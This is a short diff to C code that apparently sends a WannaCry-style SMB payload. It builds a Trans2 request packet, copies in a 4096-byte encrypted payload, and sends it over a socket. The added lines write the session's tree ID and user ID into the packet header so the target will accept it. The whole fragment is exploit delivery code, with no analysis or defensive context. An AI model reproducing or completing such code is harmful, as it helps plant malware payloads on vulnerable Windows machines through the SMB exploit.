@@ -247,6 +247,10 @@ int main(int argc, char* argv[])
 	//copy encrypted payload
 	memcpy(big_packet + wannacry_Trans2_Request + 12, encrypted, 4096);
 
+	//Update treeID, UserID
+	memcpy(big_packet + 28, (char*)&treeid, 2);
+	memcpy(big_packet + 32, (char*)&userid, 2);
+	
   	//send packet
 	send(sock, (char*)big_packet, sizeof(big_packet)-1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
